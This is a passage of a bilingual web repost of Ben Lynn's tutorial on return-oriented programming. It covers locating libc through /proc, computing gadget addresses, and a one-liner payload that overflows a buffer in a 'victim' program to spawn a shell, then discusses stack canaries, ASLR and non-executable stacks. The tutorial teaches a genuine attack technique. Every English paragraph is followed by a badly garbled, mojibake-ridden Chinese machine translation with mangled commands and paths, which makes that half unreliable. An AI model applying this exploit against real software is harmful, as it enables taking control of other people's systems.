c3ï¼†ï¼ƒ34;ï¼Œå¹¶ä¸åŒ¹é…ä¸€èµ·æ‰“å°ä¸€è¡Œé¢†å…ˆçš„ä¸Šä¸‹æ–‡ã€‚æˆ‘ä»¬è¿˜æ‰“å°äº†è¡Œå·ã€‚</p><p>  As line numbers start from 1 and offsets start from 0, we must subtract 1 to get the latter from the former. Also, we want the address in hexadecimal. Asking Awk to treat the first argument as a number (due to the subtraction) conveniently drops all the characters after the digits, namely the &#34;-5f&#34; that grep outputs.</p><p>  ç”±äºè¡Œå·ä»1å¼€å§‹ï¼Œåç§»å¼€å§‹ä»0å¼€å§‹ï¼Œæˆ‘ä»¬å¿…é¡»å‡å»1ä»¥ä»å‰è€…é‚£é‡Œå¾—åˆ°åè€…ã€‚æ­¤å¤–ï¼Œæˆ‘ä»¬å¸Œæœ›åå…­è¿›åˆ¶ä¸­çš„åœ°å€ã€‚è¦æ±‚awkå°†ç¬¬ä¸€ä¸ªå‚æ•°è§†ä¸ºä¸€ä¸ªæ•°å­—ï¼ˆç”±äºå‡æ³•ï¼‰æ–¹ä¾¿åœ°åˆ é™¤æ•°å­—åçš„æ‰€æœ‰å­—ç¬¦ï¼Œå³ï¼†ï¼ƒ34; -5fï¼†ï¼ƒ34;é‚£ä¸ªgrepè¾“å‡ºã€‚ </p><p>   then on executing the next RET instruction, the program will pop the address of&#34;/bin/sh&#34; into RDI thanks to the first gadget, then jump to the systemfunction.</p><p>ç„¶ååœ¨æ‰§è¡Œä¸‹ä¸€ä¸ªretæŒ‡ä»¤æ—¶ï¼Œç¨‹åºå°†å¼¹å‡ºï¼†ï¼ƒ34çš„åœ°å€; / bin / shï¼†ï¼ƒ34;ç”±äºç¬¬ä¸€ä¸ªå°å·¥å…·è¿›å…¥RDIï¼Œç„¶åè·³è½¬åˆ°ç³»ç»ŸåŠŸèƒ½ã€‚</p><p> $ pid=`ps -C victim -o pid --no-headers | tr -d &#39; &#39;`$ grep libc /proc/$pid/maps7ffff7a1d000-7ffff7bd0000 r-xp 00000000 08:05 7078182 /lib/x86_64-linux-gnu/libc-2.15.so7ffff7bd0000-7ffff7dcf000 ---p 001b3000 08:05 7078182 /lib/x86_64-linux-gnu/libc-2.15.so7ffff7dcf000-7ffff7dd3000 r--p 001b2000 08:05 7078182 /lib/x86_64-linux-gnu/libc-2.15.so7ffff7dd3000-7ffff7dd5000 rw-p 001b6000 08:05 7078182 /lib/x86_64-linux-gnu/libc-2.15.so</p><p> $ pid =`ps -cå—å®³è€…-o pid --no-headers | TR -Dï¼†ï¼ƒ39; ï¼†ï¼ƒ39;`$ grep libc / proc / $ pid / maps7aff7a1d000-7fff7bd0000 r-xp 00000000 08:05 7078182 /llib/x86_64-linux-gnu/libc-2.15.so7ffff7bd0000-7ffff7dcf000 --- p 001b3000 08:05 7078182 /llib/86_64-linux-gnu/libc-2.15.so7ffff7dcf000-7ffff7dd3000 r  -  p 001b2000 08:05 7078182 /lib/x86_64-linux-gnu/libc-2.15.so7ffff7dd3000-7ffff7dd5000 rw-p 001b6000 08:05 7078182 / lib / x86_64-linux-gnu / libc-2.15.so</p><p> Thus libc is loaded into memory starting at  0x7ffff7a1d000. That gives usour first ingredient: the address of the gadget is 0x7ffff7a1d000 + 0x22a12.</p><p> å› æ­¤ï¼ŒLibcä»¥0x7ffff7a1d000å¼€å§‹åŠ è½½åˆ°å­˜å‚¨å™¨ä¸­ã€‚è¿™ç»™å‡ºäº†æ•‘åŠ©çš„ç¬¬ä¸€æˆåˆ†ï¼šå°å·¥å…·çš„åœ°å€æ˜¯0x7ffff7a1d000 + 0x22a12ã€‚</p><p> Next we want &#34;/bin/sh&#34; somewhere in memory. We can proceed similarly tobefore and place this string at the beginning of the buffer. From before,its address is  0x7fffffffe090.</p><p> æ¥ä¸‹æ¥æˆ‘ä»¬æƒ³è¦ï¼†ï¼ƒ34; / bin / shï¼†ï¼ƒ34;åœ¨è®°å¿†ä¸­çš„æŸä¸ªåœ°æ–¹ã€‚æˆ‘ä»¬å¯ä»¥åŒæ ·åœ°è¿›è¡Œè„šæ­¥ï¼Œå¹¶åœ¨ç¼“å†²åŒºçš„å¼€å¤´æ”¾ç½®æ­¤å­—ç¬¦ä¸²ã€‚ä»ä¹‹å‰ï¼Œå®ƒçš„åœ°å€æ˜¯0x7FFFFFFFE090ã€‚</p><p>    $ (echo -n /bin/sh | xxd -p; printf %0130d 0;printf %016x $((0x7ffff7a1d000+0x22a12)) | tac -rs..;printf %016x 0x7fffffffe090 | tac -rs..;printf %016x $((0x7ffff7a1d000+0x44320)) | tac -rs..) |xxd -r -p | setarch `arch` -R ./victim</p><p>    $ï¼ˆecho -n / bin / sh | xxd -p; printfï¼…0130d 0; printfï¼…016x $ï¼ˆï¼ˆ0x7ffff7a1d000 + 0x22a12ï¼‰ï¼‰| tac -rs ..; printfï¼…016x 0x7fffffffe090 | tac -rs ..; printfï¼… 016x $ï¼ˆï¼ˆ0x7ffff7a1d000 + 0x44320ï¼‰ï¼‰| TAC -RS ..ï¼‰| XXD -R -P | setarch` arch` -r ./victim</p><p> Hit enter a few times, then type in some commands to confirm this indeedspawns a shell.</p><p> ç‚¹å‡»å‡ æ¬¡ï¼Œç„¶åè¾“å…¥ä¸€äº›å‘½ä»¤ä»¥ç¡®è®¤è¿™æ˜¯ä¸€ä¸ªshellã€‚</p><p> There are 130 0s this time, which xxd turns into 65 zero bytes. This isexactly enough to cover the rest of the buffer after &#34;/bin/sh&#34; as well as thepushed RBP register, so that the very next location we overwrite is the top ofthe stack.</p><p> è¿™æ¬¡æœ‰130ä¸ª0sï¼ŒXXDå˜æˆäº†65ä¸ªé›¶ä¸ªå­—èŠ‚ã€‚è¿™ç§æƒ…å†µä¸è¶³ä»¥è¦†ç›–ï¼†ï¼ƒ34ä¹‹åçš„å…¶ä½™ç¼“å†²åŒº; / bin / shï¼†ï¼ƒ34;é™¤äº†ThePushedçš„RBPå¯„å­˜å™¨ï¼Œä½¿æˆ‘ä»¬è¦†ç›–çš„ä¸‹ä¸€ä¸ªä½ç½®æ˜¯å †æ ˆçš„é¡¶éƒ¨ã€‚ </p><p> In our brief adventure, ProPolice is the best defence. It tries to move arraysto the highest parts of the stack, so less can be achieved by overflowing them.Additionally, it places certain values at the ends of arrays, which areknown as  canaries. It inserts checks before return instructions that haltsexecution if the canaries are harmed. We had to disable ProPolice completely toget started.</p><p>åœ¨æˆ‘ä»¬çš„ç®€çŸ­å†’é™©ä¸­ï¼Œæ™®ç½—å°”å°¼æ˜¯æœ€å¥½çš„é˜²å®ˆã€‚å®ƒè¯•å›¾å°†ArrayStoç§»åŠ¨åˆ°å †æ ˆçš„æœ€é«˜éƒ¨åˆ†ï¼Œå› æ­¤å¯ä»¥é€šè¿‡æº¢å‡ºå®ƒä»¬æ¥å®ç°è¾ƒå°‘.Aditionallyï¼Œå®ƒåœ¨é˜µåˆ—çš„æœ«ç«¯å¤„ç½®äºé˜µåˆ—çš„æœ«å°¾ï¼Œè¯¥å€¼è¢«ç§°ä¸ºé‡‘ä¸é›€ã€‚å¦‚æœå¤§å…¬è€…å—åˆ°ä¼¤å®³ï¼Œå®ƒä¼šåœ¨è¿”å›åœæ­¢æŒ‡ä»¤ä¹‹å‰æ’å…¥æ£€æŸ¥ã€‚æˆ‘ä»¬ä¸å¾—ä¸å®Œå…¨ç¦ç”¨æ™®ç‰›çŠ¬å¼€å§‹ã€‚</p><p> ASLR also defends against our attack provided there is sufficient entropy,and the randomness is kept secret. This is in fact rather tricky. We saw howolder systems leaked information via /proc. In general, attackers have devisedmany ingenious methods to learn addresses that are meant to be hidden.</p><p> ASLRè¿˜æå«æˆ‘ä»¬çš„æ”»å‡»ï¼Œåªè¦æœ‰è¶³å¤Ÿçš„ç†µï¼Œéšæœºæ€§ä¿æŒç§˜å¯†ã€‚è¿™å®é™…ä¸Šæ˜¯ç›¸å½“æ£˜æ‰‹çš„ã€‚æˆ‘ä»¬çœ‹åˆ°è±ªç´¢ç³»ç»Ÿé€šè¿‡/ procæ³„éœ²äº†ä¿¡æ¯æ³„éœ²äº†ä¿¡æ¯ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œæ”»å‡»è€…å·²ç»è®¾è®¡äº†å·§å¦™çš„æ–¹æ³•æ¥å­¦ä¹ éšè—çš„åœ°å€ã€‚</p><p> Last, and least, we have executable space protection. It turned out to betoothless. So what if we canâ€™t run code in the stack? Weâ€™ll simply point tocode elsewhere and run that instead! We used libc, but in general,there is usually some corpus of code we can raid. For example, researcherscompromised a voting machine with extensive executable space protection,turning its own code against it.</p><p> æœ€åï¼Œæœ€å°‘ï¼Œæˆ‘ä»¬æœ‰å¯æ‰§è¡Œçš„ç©ºé—´ä¿æŠ¤ã€‚äº‹å®è¯æ˜ï¼Œå®ƒè¢«ç”ŸåŠ¨äº†ã€‚é‚£ä¹ˆå¦‚æœæˆ‘ä»¬ä¸èƒ½åœ¨å †æ ˆä¸­è¿è¡Œä»£ç æ€ä¹ˆåŠï¼Ÿæˆ‘ä»¬å°†ç®€å•åœ°æŒ‡å‘å…¶ä»–åœ°æ–¹çš„ä»£ç å¹¶è¿è¡Œå®ƒï¼æˆ‘ä»¬ä½¿ç”¨äº†libcï¼Œä½†ä¸€èˆ¬æ¥è¯´ï¼Œé€šå¸¸æœ‰ä¸€äº›ä»£ç è¯­æ–™åº“æˆ‘ä»¬å¯ä»¥raidã€‚ä¾‹å¦‚ï¼Œç ”ç©¶äººå‘˜ç»„ç»‡äº†ä¸€ä¸ªå…·æœ‰å¹¿æ³›å¯æ‰§è¡Œç©ºé—´ä¿æŠ¤çš„æŠ•ç¥¨æœºï¼Œå°†è‡ªå·±çš„ä»£ç åå¯¹å®ƒã€‚</p><p>  ASLR requires cooperation from many parties. Programs and libraries alike must be loaded in random addresses. Information leaks must be plugged.</p><p>  ASLRéœ€è¦ä¸è®¸å¤šç¼”çº¦æ–¹çš„åˆä½œã€‚ç¨‹åºå’Œå›¾ä¹¦é¦†å¿…é¡»åœ¨éšæœºåœ°å€ä¸­åŠ è½½ã€‚å¿…é¡»æ’å…¥ä¿¡æ¯æ³„æ¼ã€‚</p><p> Somebody must have thought so, because it is so prevalent now.Perhaps itâ€™s time to ask: is executable space protection worth removing?Is executable space protection better than nothing?</p><p> æœ‰äººä¸€å®šæ˜¯æƒ³åˆ°çš„ï¼Œå› ä¸ºå®ƒç°åœ¨å¦‚æ­¤æ™®éã€‚ç°åœ¨æ˜¯æ—¶å€™é—®ï¼šæ˜¯å¯æ‰§è¡Œçš„ç©ºé—´ä¿æŠ¤å€¼å¾—åˆ é™¤å—ï¼Ÿå¯æ‰§è¡Œç©ºé—´ä¿æŠ¤æ¯”ä»€ä¹ˆéƒ½å¥½å—ï¼Ÿ</p><p> We just saw how trivial it is to stitch together shreds of existing codeto do our dirty work. We barely scratched the surface: with just a few gadgets,any computation is possible. Furthermore, there are tools that mine librariesfor gadgets, and compilers that convert an input language into a series ofaddresses, ready for use on an unsuspecting non-executable stack. Awell-armed attacker may as well forget executable space protection evenexists.</p><p> æˆ‘ä»¬åˆšçœ‹åˆ°å®ƒæ˜¯å¤šä¹ˆå¾®è§‚ï¼Œç¼åˆåœ¨ä¸€èµ·çš„ç°æœ‰Codetoåšæˆ‘ä»¬è‚®è„çš„å·¥ä½œã€‚æˆ‘ä»¬å‡ ä¹æ²¡æœ‰åˆ’ä¼¤è¡¨é¢ï¼šåªæœ‰å‡ ä¸ªå°å·¥å…·ï¼Œä»»ä½•è®¡ç®—éƒ½æ˜¯å¯èƒ½çš„ã€‚æ­¤å¤–ï¼Œè¿˜æœ‰å·¥å…·ï¼Œç”¨äºå°†è¾“å…¥è¯­è¨€è½¬æ¢ä¸ºofddressesç³»åˆ—çš„å°å·¥å…·ï¼Œä»¥åŠå°†è¾“å…¥è¯­è¨€è½¬æ¢ä¸ºä¸€ç³»åˆ—çš„ç¼–è¯‘å™¨ï¼Œå¯ç”¨äºæ¯«æ— ç–‘é—®çš„ä¸å¯æ‰§è¡Œçš„å †æ ˆã€‚ä»¤äººç•ç¼©çš„æ”»å‡»è€…å¯èƒ½å¿˜è®°å¯æ‰§è¡Œç©ºé—´ä¿æŠ¤å¶æ•°ã€‚</p><p> Therefore, I argue executable space protection is worse than nothing.Aside from being high-cost and low-benefit, it segregates code from data. As Rob Pike puts it:</p><p> å› æ­¤ï¼Œæˆ‘è®¤ä¸ºå¯æ‰§è¡Œç©ºé—´ä¿æŠ¤æ¯”æ²¡æœ‰æ›´ç³Ÿç³•ã€‚å¯ä»¥ä»é«˜æˆæœ¬å’Œä½åˆ©ç›Šï¼Œå®ƒä»æ•°æ®ä¸­éš”ç¦»ä»£ç ã€‚æŠ¢åŠ«æ´¾å…‹è¿™ä»¶äº‹ï¼š </p><p> This flies in the face of the theories of Turing and von Neumann, whichdefine the basic principles of the stored-program computer. Code and dataare the same, or at least they can be.</p><p>è¿™åœ¨é¢å¯¹å›¾çµå’Œå†¯è¯ºä¼Šæ›¼çš„ç†è®ºé¢å‰ï¼Œè¿™å°†ç»¼åˆæ‚äºå‚¨å­˜ç¨‹åºè®¡ç®—æœºçš„åŸºæœ¬åŸåˆ™ã€‚ä»£ç å’Œdataareç›¸åŒï¼Œæˆ–è€…è‡³å°‘å¯ä»¥ã€‚</p><p> Executable space protection interferes with self-modifying code, which isinvaluable for just-in-time compiling, and for miraculously breathing new lifeinto ancient calling conventions set in stone.</p><p> å¯æ‰§è¡Œç©ºé—´ä¿æŠ¤å¹²æ‰°äº†è‡ªä¿®æ”¹çš„ä»£ç ï¼Œè¯¥ä»£ç æ˜¯å¯ç”¨äºå‡†æ—¶ç¼–è¯‘çš„ï¼Œä»¥åŠå¥‡è¿¹èˆ¬åœ°å‘¼å¸æ–°çš„LifeIntoå¤è€çš„å‘¼å«çº¦å®šåœ¨çŸ³å¤´ä¸Šè®¾ç½®ã€‚</p><p> In  a paper describing how to addnested functions to C despite its simple calling convention and thin pointers,Thomas Breuel observes:</p><p> åœ¨ä¸€ä¸ªæè¿°å¦‚ä½•ä¸ºCçš„å‡½æ•°æ·»åŠ åˆ°Cçš„è®ºæ–‡ä¸­ï¼Œå°½ç®¡å®ƒæ˜¯ç®€å•çš„å‘¼å«çº¦å®šå’Œè–„æŒ‡é’ˆï¼ŒThomas Breuelè§‚å¯Ÿï¼š</p><p> There are, however, some architectures and/or operating systems that forbid a program to generate and execute code at runtime. We consider this restriction arbitrary and consider it poor hardware or software design. Implementations of programming languages such as FORTH, Lisp, or Smalltalk can benefit significantly from the ability to generate or modify code quickly at runtime.</p><p> ç„¶è€Œï¼Œæœ‰äº›æ¶æ„å’Œ/æˆ–æ“ä½œç³»ç»Ÿç¦æ­¢åœ¨è¿è¡Œæ—¶ç”Ÿæˆå’Œæ‰§è¡Œä»£ç çš„ç¨‹åºã€‚æˆ‘ä»¬è®¤ä¸ºè¿™ä¸€é™åˆ¶æ˜¯ä»»æ„çš„ï¼Œå¹¶è€ƒè™‘å®ƒçš„ç¡¬ä»¶æˆ–è½¯ä»¶è®¾è®¡å·®ã€‚è¯¸å¦‚è§„åˆ’è¯­è¨€çš„å®ç°ï¼Œä¾‹å¦‚ï¼ŒLISPæˆ–SmallTalkå¯ä»¥ä»è¿è¡Œæ—¶å¿«é€Ÿç”Ÿæˆæˆ–ä¿®æ”¹ä»£ç çš„èƒ½åŠ›æ˜¾ç€åœ°å—ç›Šã€‚</p><p> Many thanks to  Hovav Shacham, who firstbrought return-oriented programming to my attention. He co-authored a comprehensive introduction toreturn-oriented programming. Also, see the technical details of how return-oriented programmingusurped a voting machine.</p><p> éå¸¸æ„Ÿè°¢Hovav Shachamï¼Œä»–ä»¬å…ˆå‘åˆ¶äººå½’æ¥ä»¥è¿”å›çš„ç¼–ç¨‹ä¸ºæˆ‘çš„æ³¨æ„åŠ›ã€‚ä»–å…±åŒæ’°å†™äº†å…¨é¢ä»‹ç»äº†ä»¥Toreturnä¸ºå¯¼å‘çš„ç¼–ç¨‹ã€‚æ­¤å¤–ï¼Œè¯·å‚é˜…å¦‚ä½•è¿”å›è¿”å›çš„ç¼–ç¨‹çš„æŠ€æœ¯ç»†èŠ‚ã€‚</p><p> We focused on a specific attack. The defences we ran into can be much lesseffective for other kinds of attacks. For example, ASLR has a hard timefending off heap spraying.</p><p> æˆ‘ä»¬ä¸“æ³¨äºç‰¹å®šçš„æ”»å‡»ã€‚å¯¹äºå…¶ä»–ç§ç±»çš„æ”»å‡»ï¼Œæˆ‘ä»¬é‡åˆ°çš„é˜²å¾¡å¯èƒ½æ˜¯æ— æ•ˆçš„ã€‚ä¾‹å¦‚ï¼ŒASLRçš„å †å å–·æ¶‚å¾ˆéš¾ã€‚</p><p> Return-oriented programming is a generalization of the return-to-libc attack,which calls library functions instead of gadgets. In 32-bit Linux, theC calling convention is helpful, since arguments are passed on the stack:all we need to do is rig the stack so it holds our arguments and the addressthe library function. When RET is executed, weâ€™re in business.</p><p> ä»¥è¿”å›è¿”å›çš„ç¼–ç¨‹æ˜¯è¿”å›libcæ”»å‡»çš„æ¦‚æ‹¬ï¼Œè¯¥æ”»å‡»è°ƒç”¨åº“å‡½æ•°è€Œä¸æ˜¯å°å·¥å…·ã€‚åœ¨32ä½Linuxä¸­ï¼ŒThec Calling Aructoryæœ‰ç”¨ï¼Œå› ä¸ºå‚æ•°é€šè¿‡å †æ ˆä¼ é€’ï¼šæˆ‘ä»¬éœ€è¦åšçš„åªæ˜¯é’»æœºå †æ ˆï¼Œä»¥ä¾¿å †å æˆ‘ä»¬çš„å‚æ•°å’Œåœ°å€åº“å‡½æ•°ã€‚æ‰§è¡Œæ—¶ï¼Œæˆ‘ä»¬æ­£åœ¨å•†ä¸šã€‚ </p><p> However, the 64-bit C calling convention is identical to that of 64-bit systemcalls, except RCX takes the place of R10, and more than 6 arguments may bepresent (any extras are placed on the stack in right-to-left order).Overflowing the buffer only allows us to control the contents of the stack,and not the registers, complicating return-to-libc attacks.</p><p>ä½†æ˜¯ï¼Œ64ä½Cå‘¼å«çº¦å®šä¸64ä½ç³»ç»Ÿå…³è”çš„ç›¸åŒï¼Œé™¤äº†RCXå R10çš„ä½ç½®ï¼Œå¹¶ä¸”å¯èƒ½å­˜åœ¨è¶…è¿‡6ä¸ªå‚æ•°ï¼ˆä»»ä½•é¢å¤–çš„é™„ä»¶ä»¥å·¦å³å·¦å³æ’åˆ—åœ¨å †æ ˆä¸Šï¼‰ .Flowingç¼“å†²åŒºä»…å…è®¸æˆ‘ä»¬æ§åˆ¶å †æ ˆçš„å†…å®¹ï¼Œè€Œä¸æ˜¯å¯„å­˜å™¨ï¼Œå¹¶ä¸å¤æ‚è¿”å›libcæ”»å‡»ã€‚</p><p> Just as builders remove the scaffolding after finishing a skyscraper, I omittedthe GDB sessions which helped me along the way. Did you think I could getthese exploits byte-perfect the first time? I wish!</p><p> æ­£å¦‚å»ºé€ è€…åœ¨å®Œæˆæ‘©å¤©å¤§æ¥¼åå–å‡ºè„šæ‰‹æ¶ä¸€æ ·ï¼Œæˆ‘çœç•¥äº†GDBä¼šè¯ï¼Œå¸®åŠ©æˆ‘æ²¿é€”ã€‚ä½ è®¤ä¸ºæˆ‘æœ‰æ²¡æœ‰ç¬¬ä¸€æ¬¡å®Œç¾åœ°åˆ©ç”¨å­—èŠ‚ï¼Ÿæˆ‘å¸Œæœ›ï¼</p><p> Speaking of which, Iâ€™m almost certain Iâ€™ve never used a debugger to debug!Iâ€™ve only used them to program in assembly, to investigate binaries forwhich I lacked the source, and now, for buffer overflow exploits. A quote fromLinus Torvalds come to mind:</p><p> è¯´åˆ°å“ªäº›ï¼Œæˆ‘å·®ä¸å¤šç¡®å®šæˆ‘ä»æ¥æ²¡æœ‰ç”¨è°ƒè¯•å™¨è°ƒè¯•ï¼æˆ‘åªç”¨å®ƒä»¬åœ¨è£…é…ä¸­ç¼–ç¨‹ï¼Œè°ƒæŸ¥ä¸€å‰¯æˆ‘ç¼ºå°‘æ¥æºï¼Œç°åœ¨ï¼Œå¯¹äºç¼“å†²åŒºæº¢å‡ºæ¼æ´ã€‚ Fromlinus Torvaldsçš„æŠ¥ä»·æ¥æ‰¾ï¼š</p><p> I donâ€™t like debuggers. Never have, probably never will. I use gdb all thetime, but I tend to use it not as a debugger, but as a disassembler onsteroids that you can program.</p><p> æˆ‘ä¸å–œæ¬¢è°ƒè¯•å™¨ã€‚ä»æ¥æ²¡æœ‰ï¼Œå¯èƒ½æ°¸è¿œä¸ä¼šã€‚æˆ‘ä½¿ç”¨GDBæ‰€æœ‰è½®åŠ¨ï¼Œä½†æˆ‘å€¾å‘äºä½¿ç”¨å®ƒä¸æ˜¯è°ƒè¯•å™¨ï¼Œè€Œæ˜¯ä½œä¸ºæ‚¨å¯ä»¥ç¼–ç¨‹çš„åæ±‡ç¼–æ‰¬å£°å™¨ã€‚</p><p>  The most effective debugging tool is still careful thought, coupled with judiciously placed print statements.</p><p>  æœ€æœ‰æ•ˆçš„è°ƒè¯•å·¥å…·ä»ç„¶æ˜¯è°¨æ…çš„æƒ³æ³•ï¼Œä¸æ˜æ™ºåœ°æ”¾ç½®çš„æ‰“å°é™ˆè¿°è€¦åˆã€‚</p><p> Iâ€™m unsure if Iâ€™ll ever write about GDB, since so many guides already exist.For now, Iâ€™ll list a few choice commands:</p><p> æˆ‘ä¸ç¡®å®šï¼Œå¦‚æœæˆ‘ä¼šå†™GDBï¼Œå› ä¸ºå·²ç»å­˜åœ¨äº†å¾ˆå¤šæŒ‡å—ã€‚å¦‚æœç°åœ¨ï¼Œæˆ‘å°†åˆ—å‡ºä¸€äº›é€‰æ‹©å‘½ä»¤ï¼š</p><p>  GDB helpfully places the code deterministically, though the location itchooses differs slightly to the shellâ€™s choice when ASLR is disabled.</p><p>  GDBæœ‰åŠ©äºç¡®å®šä»£ç ï¼Œå°½ç®¡å½“ç¦ç”¨ASLRæ—¶ï¼Œä½ç½®ç˜™ç—’ä¸Shellçš„é€‰æ‹©ç•¥å¾®ä¸åŒã€‚ </p><p>  Ben Lynn  blynn@cs.stanford.edu  ğŸ’¡</p><p>Ben Lynn Blynn@cs.stanford.eduğŸ’¡ </p></div><div id="story_share_this"><div class="sharethis-inline-share-buttons"></div></div><div class="text-break sotry_link page_narrow"><a target="_blank" href="https://crypto.stanford.edu/~blynn/rop/">https://crypto.stanford.edu/~blynn/rop/</a></div><div class="story_tags page_narrow"><button type="button" class="btn btn-light my_tag"><a href="/tag/linux/">#linux</a></button><button type="button" class="btn btn-light my_tag"><a href="/tag/ç¼–ç¨‹/">#ç¼–ç¨‹</a></button><button type="button" class="btn btn-light my_tag"><a href="/tag/å †æ ˆ/">#å †æ ˆ</a></button></div></div><div class="my_movie_list_item shadow p-3 mb-5 bg-white rounded"><button type="button" class="btn btn-link my_tag"><a href="/tag/web2.0/">#web2.0</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/google/">#google</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/è®¾è®¡/">#è®¾è®¡</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/åˆ›æ„/">#åˆ›æ„</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/æ‘„å½±/">#æ‘„å½±</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/å›¾ç‰‡/">#å›¾ç‰‡</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/æ¸¸æˆ/">#æ¸¸æˆ</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/è½¯ä»¶/">#è½¯ä»¶</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/è§†é¢‘/">#è§†é¢‘</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/æ‰‹æœº/">#æ‰‹æœº</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/å¹¿å‘Š/">#å¹¿å‘Š</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/iphone/">#iphone</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/ç½‘ç«™/">#ç½‘ç«™</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/å…è´¹/">#å…è´¹</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/ä¸‹è½½/">#ä¸‹è½½</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/windows/">#windows</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/å¾®è½¯/">#å¾®è½¯</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/firefox/">#firefox</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/blog/">#blog</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/è‹¹æœ/">#è‹¹æœ</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/apple/">#apple</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/éŸ³ä¹/">#éŸ³ä¹</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/åšå®¢/">#åšå®¢</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/wordpress/">#wordpress</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/æ¶æ/">#æ¶æ</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/qq/">#qq</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/è‰ºæœ¯/">#è‰ºæœ¯</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/web/">#web</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/å·¥å…·/">#å·¥å…·</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/åˆ†äº«/">#åˆ†äº«</a></button></div></div></div><div id="my_footer"><div class=""><a href="/tags/">tags</a> <a href="/users/">users</a></div>&copy;2012-2021 diglog.com </div></div></body></html>